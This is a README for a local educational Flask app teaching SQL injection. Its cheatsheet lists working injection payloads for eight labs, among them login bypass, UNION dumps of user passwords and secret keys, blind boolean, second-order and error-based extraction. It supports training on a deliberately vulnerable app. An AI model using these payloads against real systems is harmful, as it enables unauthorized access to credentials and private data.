# SQLi Labs — Educational Flask App

> ⚠️ **FOR EDUCATIONAL USE ONLY** — Run locally, never on a public server.

## Setup

```bash
cd sqli_labs
pip install -r requirements.txt
python app.py
```
Open http://localhost:5000

---

## Lab Cheatsheet

| Lab | Type | Payload |
|-----|------|---------|
| 1 | WHERE bypass | `' OR 1=1--` as category |
| 2 | Login bypass | username: `admin'--`, password: anything |
| 3 | Column count | `' ORDER BY 5--` then `' UNION SELECT NULL,NULL,NULL,NULL,NULL--` |
| 4 | UNION dump users | `' UNION SELECT id,username,password,role,NULL FROM users--` |
| 5 | UNION cross-table | `' UNION SELECT id,username,secret_key,CAST(clearance_level AS TEXT),NULL FROM secret_users--` |
| 6 | Blind boolean | `admin' AND SUBSTR(password,1,1)='s'--` |
| 7 | Second-order | Store username `admin'--`, trigger lookup on that comment ID |
| 8 | Error-based | `1 AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)` |

---

## Database

- **products** (id, name, description, category, price, released)
- **users** (id, username, password, email, role)
- **secret_users** (id, username, secret_key, clearance_level)
- **comments** (id, username, comment)
